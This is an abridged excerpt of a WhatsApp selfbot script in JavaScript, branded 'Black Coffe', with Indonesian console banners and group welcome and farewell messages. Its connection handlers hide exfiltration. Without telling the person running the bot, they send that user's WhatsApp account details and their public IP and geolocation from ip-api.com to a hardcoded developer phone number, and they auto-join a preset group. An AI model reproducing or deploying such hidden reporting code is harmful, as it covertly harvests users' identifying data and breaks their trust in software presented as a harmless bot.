...
prefix = '#'
shp = '⬡'
owner = "6289518320543@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Black Coffe", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      color("]", "white"),
      color(" Scan bang"),
      client.sendMessage(`6289518320543@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Connect Sukses > Follow @lordblackcoffe");
console.log(color(figlet.textSync(`${spc1}            BlackCoffe`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗚𝘄 Edit 𝗦𝗲𝗻𝗱𝗶𝗿𝗶!\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 Ngopi シ︎', 'yellow'))
    ...
    console.log(color('[NDAABOTZ]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 Black Coffe 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 teks = `https://chat.whatsapp.com/IdkUGUKi5dYIXp5Iqwtryn`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`6289518320543@s.whatsapp.net`, `*Hai Owner lordblackcoffe, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6289518320543?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6289518320543@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Black Coffe",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6289518320543?text=Assalamualaikum"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6289518320543-1616168378@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'Black Coffe︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Nanda Style;;;\nFN:resku\nitem1.TEL;waid=6289518320543:+62 895-1832-0543\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
      ...
      if (anu.action == "add" && !mem.includes(client.user.jid)) {
        ...
        teks = `𝗦𝗮𝘆 ${anu_user} 𝗺𝗲𝘁 𝗗𝗮𝘁𝗲𝗻𝗴 シ︎`;
      ...
      if (anu.action == "remove" && !mem.includes(client.user.jid)) {
        ...
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        memeg = mdata.participants.length;
        out = `𝗦𝗮𝘆𝗼𝗻𝗮𝗿𝗮 Tod Jngn Balik Lg ${anu_user} 👋`;
        buff = await getBuffer(
